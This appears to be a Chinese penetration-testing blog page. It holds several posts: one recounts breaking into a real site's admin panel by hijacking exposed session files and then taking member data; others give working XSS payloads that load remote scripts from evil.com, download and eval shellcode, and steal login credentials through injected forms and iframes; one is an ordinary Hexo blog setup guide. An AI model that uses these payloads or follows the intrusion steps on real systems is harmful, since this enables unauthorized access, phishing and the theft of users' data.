<p>这个管理网站的session会不会也在DATA目录下呢？<br>打开之，<a href="http://B.com/DLadmin/data/session" target="_blank" rel="noopener">http://B.com/DLadmin/data/session</a></p>
<p>欣喜啊，确实有哦。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/9bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>打开一个看看吧。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/10bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>这个eofus56应该是登陆的用户名。<br>把这些session逐一打开，记录下了最近登陆的10个用户名，都是管理员。<br>知道帐户了，去猜解密码吧，很可惜，一个都没猜解到，韩国人，还不好社工。<br>忽然想到，伪造cookies来登陆。<br>这里我用明小子注入工具来浏览，这样能轻松查看和修改cookies。<br>先随便登陆一下，返回错误，出现了cookies。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/10bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>哈哈，用的session验证，就是说我只要PHPsessiID登陆之前登陆成功的session值就能进去了。<br>去<a href="http://B.com/DLadmin/data/session" target="_blank" rel="noopener">http://B.com/DLadmin/data/session</a><br>找一个sess_7bedb96c173c9e362e3b58445451d9a5</p>
<p>在明小子内修改cookies<br>PHPSESSID=7bedb96c173c9e362e3b58445451d9a5;<br>填好好，点修改。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/12bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>OK，进去了，进去之后，再添加一个管理，拿完会员资料，删除自己添加的管理，任务完成。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/04/03/XSS之shellcode的调用/" title="XSS之shllcode的调用" itemprop="url">XSS之shllcode的调用</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2017-04-03</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>1.动态调用远程JavaScript<br>假设<a href="http://www.bug.com是某个页面含有一个XSS漏洞,Exploit如下" target="_blank" rel="noopener">www.bug.com是某个页面含有一个XSS漏洞,Exploit如下</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=[Exploit]</span><br></pre></td></tr></table></figure></p>
<p>可以直接把Shellcode写到URL参数中,如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>方便起见可以把Shellcode写到其他服务器的文件上,然后在用<script>标签进行动态加载.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scriptsrc=http://www.evil.com/xss.js&gt; &lt;/script&gt;&lt;</span><br><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;scriptsrc=http://www.evil.com/xss.js&gt; &lt;/script&gt;&lt;</span><br></pre></td></tr></table></figure></p>
<p>除了使用<script>标签动态调用远程JavaScript,还可以运用基于DOM的方法创建和插入节点,<br>把脚本或HTML注入到网页,实现过程如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vars=document.creteElement(&quot;script&quot;);</span><br><span class="line">s.src=&quot;http://www.evil.com/xss.js&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(s);</span><br></pre></td></tr></table></figure></p>
<p>第一行代码使用createElement()函数创建一个新元素—script<br>第二行代码把<script>的src属性设置成”<a href="http://www.evil.com/xss.js&quot;,xss.js里面鞋油Shellcode代码">http://www.evil.com/xss.js&quot;,xss.js里面鞋油Shellcode代码</a>.<br>第三行代码使用GetElementsByTagName()函数查找并返回文档中第一个元素(因为索引为0),<br>然后利用appendChild()函数调用元素参数s,追加指定的节点到子节点列表的最后一个.<br>简单来说,这段脚本的作用就是动态创建了一个<script>标签,其src属性指向<a href="http://www.evil.com/xss.js.然后把引用JavaScript的代码插入到网页的">http://www.evil.com/xss.js.然后把引用JavaScript的代码插入到网页的</a><head>标签后</p>
<h3 id="2-使用window-location-hash"><a href="#2-使用window-location-hash" class="headerlink" title="2.使用window.location.hash"></a>2.使用window.location.hash</h3><p>如果仅仅是为了解决URL字符长度问题,还可以使用另一种方式实现Shellcode的存储和调用—利用window.location.hash属性.<br>location是JavaScript管理地址栏的内置对象,比如location.href用来管理页面的UTL,用location.href=url就可以直接将页面重定向URL,而location.hash则可以用来获取或设置页面的标签值.比如<a href="http://domain/#admin的location.hash=&quot;#admin&quot;,利用这个属性值可以做一件非常有意义的事情">http://domain/#admin的location.hash=&quot;#admin&quot;,利用这个属性值可以做一件非常有意义的事情</a>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=[Exploit]</span><br></pre></td></tr></table></figure></p>
<p>如果结合location.hash的特性调用Shellcode,具体如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure></p>
<p>其中substr()可在字符串中抽取从start下标(这里是1)开始的指定数目的字符,所以location.hash.substr(1)的作用是抽取”#”符号后面的字符,即alert(‘xss’).而eval()函数用来计算某个字符串,并执行其中的JavaScript代码,通过这个技巧,就能先把Shellcode写到地址参数中在执行.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#varurl=&quot;/index.php?mod=blog&amp;act=dopost&quot;;varcontent=&quot;blog_content=By%3A%E5%AD%A4&quot;;function_sd_Post(Url,Args)&#123;varxmlhttp;var error;eval(&apos;try &#123;xmlhttp=newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;catch(e)&#123;xmlhttp=null;error=e;&#125;&apos;);if(null!=xmlhttp)&#123;xmlhttp.Open(&quot;POST&quot;,Url,false);xmlhttp.setRequestHeader(&quot;x-requested-with&quot;,&quot;XMLHttpRequest&quot;);xmlhttp.setRequestHeader(&quot;Referer&quot;,&quot;http://www.my.com/api_proxy.html&quot;);xmlhttp.setRequestHeader(&quot;Accept&quot;,&quot;application/json,text/javascript,*/*&quot;);xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.setRequestHeader(&quot;Host&quot;,&quot;www.my.com&quot;);xmlhttp.Send(Args);StrText=xmlhttp.reponseText;&#125;&#125;_sd_Post(url,content);</span><br></pre></td></tr></table></figure></p>
<p>这个XSS Exploit还可以经过各种编码处理以加强迷惑性.</p>
<h3 id="3-XSSDownloader"><a href="#3-XSSDownloader" class="headerlink" title="3.XSSDownloader"></a>3.XSSDownloader</h3><p>另外一种存储和调用Shellcode的方法,即将其存储到网站的数据库中,包括网页信息、文章内容、个人资料等地方,然后再把他们下载下来执行.<br>简单地说,就是打造一个XSSdownloader(XSS下载器),事先把Shellcode写在网站的某个页面,在利用XMLHTTP控件向网站发送HTTP请求(POST或GET),然后执行返回的数据.<br>简单的POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">functionXSS()&#123;       /*定义一个XSS()函数,该函数就是调用Shellcode的主函数*/</span><br><span class="line">a=newActiveXObject(&apos;Microsoft.XMLHTTP&apos;);  /*创建一个XMLHTTP对象*/</span><br><span class="line">a.Open(&apos;get&apos;,&apos;http://www.bug.com/11221.html&apos;,false);</span><br><span class="line">a.send();           /*向11221.html发送一个HTTP请求并获取HTTP响应*/</span><br><span class="line">b=a.responseText;  /*获取responseText,结果返回为字符串,把该变量赋值给b变量*/</span><br><span class="line">eval(unescape(b.substring(b.indexOf(&apos;BOF|&apos;)+4,b.indexOf(&apos;|EOF&apos;))));</span><br><span class="line">                  /*用indexOf()函数计算BOF|和|EOF的位置,再用substring()函数方法取</span><br><span class="line">                  出字符串,最后用unescape()函数方法解码执行*/</span><br><span class="line">&#125;d()</span><br><span class="line"> </span><br><span class="line">http://www.bug.com/11221.html页面代码:</span><br><span class="line">Xx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212</span><br></pre></td></tr></table></figure></p>
<p>真实XSS利用案例:<br>某网站同学录留言的贴图URL输入框处出现过XSS,主要是用onload事件来触发,Exploit如下:<br>在留言的贴图URL的输入框里填写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/editor/UploadFile/2006-12/2/2006122155124754.gif&quot;onload=&quot;var t=document.body.innerHTML;var s=t.indexOf(&apos;+++&apos;)+3;vare=t.indexOf(&apos;---&apos;);eval(unescape(t.substring(s,e)));&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>在留言框内填写:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++try%20%7B%0D%0A%09var%20as%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0D%0A%09var%20frm%20%3D%20document.getElementsByTagName%28%22iframe%22%29%5B0%5D%3B%0D%0A%09frm.onload%20%3D%20function%28%29%20%7B%0D%0A%09%09var%20oFrm%20%3D%20document.getElementsByTagName%28%22iframe%22%29%5B0%5D%3B%0D%0A%09%09oFrm.onload%20%3D%20%22%22%3B%0D%0A%09%09var%20oDoc%20%3D%20oFrm.contentWindow.document%3B%0D%0A%09%09oDoc.all%5B%22who%22%5D%5B1%5D.checked%20%3D%20true%3B%0D%0A%09%09oDoc.dealmember.action%20%3D%20%22backaction/UpdateClassMate.jsp%3Ff%3D1%22%3B%0D%0A%09%09oDoc.dealmember.submit%28%29%3B%0D%0A%09%7D%0D%0A%09frm.src%20%3D%20as%5B34%5D.href%3B%0D%0A%7D%20catch%20%28e%29%20%7B%0D%0A%09alert%28e%29%3B%0D%0A%7D---</span><br></pre></td></tr></table></figure></p>
<p>XSS代码触发后,会调用留言内容中的+++和—之间的部分代码,对这段代码解码后得到核心的Shellcode如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">var as =document.getElementsByTagName(&quot;a&quot;);</span><br><span class="line">var frm= document.getElementsByTagName(&quot;iframe&quot;)[0];</span><br><span class="line">frm.onload= function() &#123;</span><br><span class="line">var oFrm= document.getElementsByTagName(&quot;iframe&quot;)[0];</span><br><span class="line">oFrm.onload= &quot;&quot;;</span><br><span class="line">var oDoc= oFrm.contentWindow.document;</span><br><span class="line">oDoc.all[&quot;who&quot;][1].checked= true;</span><br><span class="line">oDoc.dealmember.action= &quot;backaction/UpdateClassMate.jsp?f=1&quot;;</span><br><span class="line">oDoc.dealmember.submit();</span><br><span class="line">&#125;</span><br><span class="line">frm.src= as[34].href;</span><br><span class="line">&#125; catch(e) &#123;</span><br><span class="line">alert(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>4.备选存储技术<br>随着XSS技术的不断发展,攻击者想出来越来越多巧妙的方法去存储和调用XSS Shellcode,较为新颖的方式是把XSS Shellcode存储在客户端本地域中,譬如HTTP cookie、Flash共享对象、UserData、localStorage等.<br>其中Cookie是客户存储技术中的传统解决方法,但是它有个明显的缺点,就是存储的容量有限,被限制在4KB内.</p>
<p>在Cookie中存储Shellcode的POC如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">functionsetShellCodz(codz)&#123;</span><br><span class="line">var exp=new Data();</span><br><span class="line">exp.setTime(exp.getTime()+365*24*60*60*1000);</span><br><span class="line">document.cookie=&apos;shellcode=&apos;+escape(codz)+&apos;;&apos;+&apos;expires=&apos;+exp.toGMTString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另一种存储容器是Flash共享对象(Shared Object,SO),类似于HTTP Cookie的运用方式,所以也被称作Flash Cookie.<br>与普通Cookie的4KB限制不同,SO存储最大可达100KB,并且可以使用任何形式的JS对象,缺点是必须要使用Flash软件.</p>
<p>除了以上两种Cookie,还可以使用IE的UserData存储XSS Shellcode.UserData是微软专门为IE在系统中开辟的一块存储空间,最少能支持64KB,不足之处是只能在IE浏览器上使用.</p>
<p>另外,HTML5也提供了两种在客户端存储数据的新方法,包括localStorage和sessionStorage,其用法基本相同.以localStorage为例，存储数据的方法是直接给window．localStorage添加一个属性,如:window.localStorage.a或者window.localStorage[“a”]<br>它的读取、写入、删除操作方法很简单,是以键值对的方式存在的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">localStorage.a=&quot;xss&quot;;</span><br><span class="line">document.write(localStorage.a);</span><br><span class="line">if (localStorage.count)</span><br><span class="line"> &#123;</span><br><span class="line"> localStorage.count=Number(localStorage.count)+1;</span><br><span class="line"> &#125;</span><br><span class="line">else</span><br><span class="line"> &#123;</span><br><span class="line"> localStorage.count=1;</span><br><span class="line"> &#125;</span><br><span class="line">document.write(&quot;访问次数&quot;+localStorage.count+ &quot; time(s) .&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这段代码会创建一个变量a,并把XSS存储进去,然后把相关信息打印出来.<br>需要支持HTML5的浏览器才能看到效果.<br>xss访问次数1 time(s) .      xss访问次数2time(s) .</p>
<p>如果要把XSS Shellcode存储在localStorage中,操作如下:</p>
<p>保存Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">functionsetShellCodz(codz)&#123;</span><br><span class="line">window.localStorage.setItem(&quot;shellcodz&quot;,codz);&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">functiongetShellCodz()&#123;</span><br><span class="line">eval(window.localStorage.getItem(&quot;shellcodz&quot;));&#125;</span><br></pre></td></tr></table></figure></p>
</script></p>
        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/04/03/在linux利用github和hexo搭建属于自己的博客/" title="在linux利用github和hexo搭建属于自己的博客" itemprop="url">在linux利用github和hexo搭建属于自己的博客</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2017-04-03</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Hexo是一个非常方便的框架，而且和github搭配真的非常棒。<br>本人是在parrot 3.11环境上搭建的，其它linux环境也是差不多的。</p>
<p>你可以访问我的博客查看效果 <a href="http://www.hery.me" target="_blank" rel="noopener">http://www.hery.me</a><br>废话不多说我们开始吧！</p>
<h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>nodejs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure></p>
<p>npm<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure></p>
<p>git<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
<h3 id="注册github"><a href="#注册github" class="headerlink" title="注册github"></a>注册github</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/</span><br></pre></td></tr></table></figure>
<p>生成ssh key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.ssh</span><br><span class="line">cd ~/.ssh</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">ssh-add ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure></p>
<p>进入GitHub的设置页面点击SSH and GPGkeys 添加一个SSH key，把以下命令输出内容复制过去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure></p>
<p>配置git<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config –global user.name “xxx”</span><br><span class="line">git config –global user.email “xxx@xxx.com”</span><br></pre></td></tr></table></figure></p>
<p>如果提示fatal: not in a git directory则在目录新建一个.git文件夹<br>一定要注意这个扩展<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></p>
<h3 id="搭建本地hexo"><a href="#搭建本地hexo" class="headerlink" title="搭建本地hexo"></a>搭建本地hexo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">cd</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line">hexo server</span><br><span class="line">npm install hexo-deployer-git –save</span><br></pre></td></tr></table></figure>
<p>在网站的_config.yml中配置deploy<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  branch: [branch]</span><br></pre></td></tr></table></figure></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>hexo g<br>hexo s</p>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>hexo d</p>
<h3 id="绑定自己的域名"><a href="#绑定自己的域名" class="headerlink" title="绑定自己的域名"></a>绑定自己的域名</h3><p>向DNS配置添加3条记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@       a     ip</span><br><span class="line">@       a     ip</span><br><span class="line">www     CNAME username.github.io</span><br></pre></td></tr></table></figure></p>
<p>注册域名之类的我就不多说了，百度一大堆，我自己在阿里云注册的，我在这里主要说的是已经放到云解析后本地怎么设置，因为这一步花了我比较多时间，所以希望大家别和我一样踩坑。<br>这里介绍两种方法<br>1,在github的xxx.github.io项目。进入[settings]标签页，在[custom domain]功能中，将域名写进去,最好www也写入，<br>2,在source文件夹中新建CNAME文件，不要后缀，把域名写入</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本上按照上面步骤可以搭建属于你自己的博客，但是要细心和有耐心，步骤漏了容易出错，我也是搭建了一晚上加一上午，中间也踩了好多坑，因为考虑到篇幅问题,就不一一列举了。欢迎各位在搭建过程中遇到的问题在下方评论说出，我看到了会一一解答</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/parrot/">parrot</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/04/03/XSS之常见钓鱼方式/" title="XSS之常见钓鱼方式" itemprop="url">XSS之常见钓鱼方式</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2017-04-03</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>XSS比较常见的钓鱼方式主要有三种:</p>
<h3 id="1，XSS重定向钓鱼（XSS-Redirect-Phishing）"><a href="#1，XSS重定向钓鱼（XSS-Redirect-Phishing）" class="headerlink" title="1，XSS重定向钓鱼（XSS Redirect Phishing）"></a>1，XSS重定向钓鱼（XSS Redirect Phishing）</h3><p>这种钓鱼方式是把当前页面重定向到一个钓鱼网站上。假如<a href="http://www.bug.com为漏洞网站，那么钓鱼网站www.evil.com就会完全仿冒正常网站的页面内容及行为，从而进行钓鱼等诈骗活动。" target="_blank" rel="noopener">www.bug.com为漏洞网站，那么钓鱼网站www.evil.com就会完全仿冒正常网站的页面内容及行为，从而进行钓鱼等诈骗活动。</a><br>假设<a href="http://www.bug.com上有一处XSS：" target="_blank" rel="noopener">www.bug.com上有一处XSS：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=[Expliot]</span><br></pre></td></tr></table></figure></p>
<p>那么，Exploit如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&quot;&apos;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这样便会让用户从当前访问的网站跳转到一个邪恶的钓鱼网站。</p>
<h3 id="2，HTML注入式钓鱼（XSS-HTML-Inject-Phishing）"><a href="#2，HTML注入式钓鱼（XSS-HTML-Inject-Phishing）" class="headerlink" title="2，HTML注入式钓鱼（XSS HTML Inject Phishing）"></a>2，HTML注入式钓鱼（XSS HTML Inject Phishing）</h3><p>HTML注入式钓鱼是指直接利用XSS漏洞注射HTML/JavaScript代码到页面中，请看下面的示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=”’&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这段代码会在正常页面中嵌入一个Form表单.<br>相应的利用代码被附加到URL处，然后构造出一个登录表单，该表单可以覆盖原页面显示，强迫用户输入账号和密码等信息。</p>
<h3 id="3，XSS-跨框架钓鱼（Iframe-Phishing）"><a href="#3，XSS-跨框架钓鱼（Iframe-Phishing）" class="headerlink" title="3，XSS 跨框架钓鱼（Iframe Phishing）"></a>3，XSS 跨框架钓鱼（Iframe Phishing）</h3><p>这种方式是通过<iframe>标签嵌入远程域的一个页面实施钓鱼，和2.3.1中所描述的例子类似，同样是利用Iframe引用第三方的内容伪造登录控件，此时主页面依然处在正常网站的域名下，因此具有很高的迷惑性。</iframe></p>
<p>假设有一个XSS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=[Expliot]</span><br><span class="line">那么，XSS Phishing Exploit如下：</span><br><span class="line">http://www.bug.com/index.php?search=&apos;&gt;&lt;iframe src=“http://www.evil.com” height=&quot;100%&quot; width=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p>Iframe的效果可以做得很真实，可以跨框架覆盖整个页面。以百度为例，新建一个HTML文档，输入下述的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=gb2312&quot;&gt;</span><br><span class="line">&lt;title&gt;百度一下，你就知道      &lt;/title&gt;</span><br><span class="line">&lt;body scroll=&quot;no&quot;&gt;</span><br><span class="line">&lt;iframe name=&quot;myFrame&quot; src=&quot;http://www.baidu.com&quot; width=&quot;100%&quot; height=&quot;100%&quot; scrolling =&quot;auto&quot; frameborder=&quot;0&quot; onload=&quot;this.style.height=document.body.clientHeight&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="钓鱼实战"><a href="#钓鱼实战" class="headerlink" title="钓鱼实战"></a>钓鱼实战</h3><p>利用钓鱼获取明文密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Form = document.forms[&quot;userslogin&quot;];</span><br><span class="line">Form.onsubmit = function()&#123;</span><br><span class="line">var iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">iframe.style.display = &quot;none&quot;;</span><br><span class="line">alert(Form.user.value);</span><br><span class="line">iframe.src = &quot;http://127.0.0.1/phishing.php?user=&quot;+Form.user.value + &quot;&amp;pass=&quot; + Form.pass.value;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
